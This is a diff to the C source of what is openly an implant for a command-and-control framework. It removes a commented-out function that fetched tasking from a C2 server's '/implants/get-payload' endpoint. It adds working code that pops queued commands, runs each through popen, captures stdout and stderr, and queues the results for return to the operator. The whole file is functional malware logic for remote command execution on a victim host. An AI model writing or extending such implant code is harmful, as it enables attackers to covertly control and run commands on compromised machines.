@@ -1,63 +1,81 @@
 #include "payload.h"
 #include "task_queue.h"
 #include "result_queue.h"
-#include "http-client.h"
 #include "config.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <cjson/cJSON.h>
 
 
 
-// int get_payload(TaskQueue *q) {
-//     char payloadURL[256];
-//     snprintf(payloadURL, sizeof(payloadURL), "%s/implants/get-payload", C2_URL);
-//     char *resp = NULL;
-//     if(http_get(payloadURL, &resp) != 0) return -1;
-
-//     cJSON *json = cJSON_Parse(resp);
-//     if(!json) {
-//         free(resp);
-//         return -1;
-//     }
-
-//     const cJSON *cmd = cJSON_GetObjectItemCaseSensitive(json, "cmd");
-//     const cJSON *cmd_id = cJSON_GetObjectItemCaseSensitive(json, "id");
-
-//     if(!cJSON_IsString(cmd) || !cmd->valuestring) {
-//         cJSON_Delete(json);
-//         free(resp);
-//         return -1;
-//     }
-
-//     if(strcmp(cmd->valuestring, "sleep 5") == 0) {
-//         cJSON_Delete(json);
-//         free(resp);
-//         return 0;
-//     }
-
-//     // Task t;
-//     // t.cmd = strdup(cmd->valuestring);
-//     // t.id = cmd_id ? cmd_id->valueint : -1;
-
-//     // tq_add(q, t);
-
-//     tq_add(q, cmd_id ? cmd_id->valueint : -1, cmd->valuestring);
-
-//     cJSON_Delete(json);
-//     free(resp);
-//     return 1;
-// };
 
 
-// int execute_payload(TaskQueue *tq, ResultQueue *rq) {};
+#define MAX_OUTPUT 8192 // not a random number 🤫
+
+// ramen lmao
+static char *slurp(FILE *f) {
+    char *buf = malloc(MAX_OUTPUT + 1);
+    if(!buf) return NULL;
+
+    size_t n = fread(buf, 1, MAX_OUTPUT, f); // reading the output of the command
+    buf[n] = '\0'; // i hate this sneaky lil character
+
+    return buf;
+}
+
+
+int execute_payload(PayloadContext *ctx) {
+
+    // printf("%s\n", ctx->tq->tasks[0].cmd);
+
+    // if (ctx->tq->len > 0) {
+    //     printf("next cmd in queue: %s\n", ctx->tq->tasks[0].cmd);
+    // } else {
+    //     // no tasks to show
+    //     printf("payload_job: queue is empty\n");
+    // }
+
+
+    Task t;
+    if(tq_pop(ctx->tq, &t) == 0) {
+        // printf("huh nothing here, debug\n");
+        return 0;
+    };
+
+    // execution and capture of stdout and stderr
+    char cmdline[512];
+    snprintf(cmdline, sizeof cmdline, "%s 2>&1", t.cmd);
+
+    FILE *f = popen(cmdline, "r");
+    if(!f) {
+        rq_add(ctx->rq, t.id, "*", "Implant failed to execute command");
+        free(t.cmd);
+        // printf("huh this failed, debug\n");
+        return -1;
+    }
+
+    char *output = slurp(f);
+    pclose(f);
+
+    if(!output) output = strdup("NO OUTPUT");
+
+    rq_add(ctx->rq, t.id, "*", output);
+    printf("✅ - Executed task %d, output: %s\n", t.id, output);
+
+    free(output);
+    free(t.cmd);
+    return 1;
+}
 
 
 
-// void payload_job(void *c) {
-//     PayloadContext *ctx = c;
-//     get_payload(ctx->tq);
-//     execute_payload(ctx->tq, ctx->rq);
-// }
+void payload_job(void *c) {
+    PayloadContext *ctx = (PayloadContext *)c;
+    int rc; // result code? idk what to name this one
 
+    while((rc = execute_payload(ctx)) == 1) {}
+
+    if(rc < 0) {
+        printf("💥 - hell nah payload job hit an error\n");
+    }
+}
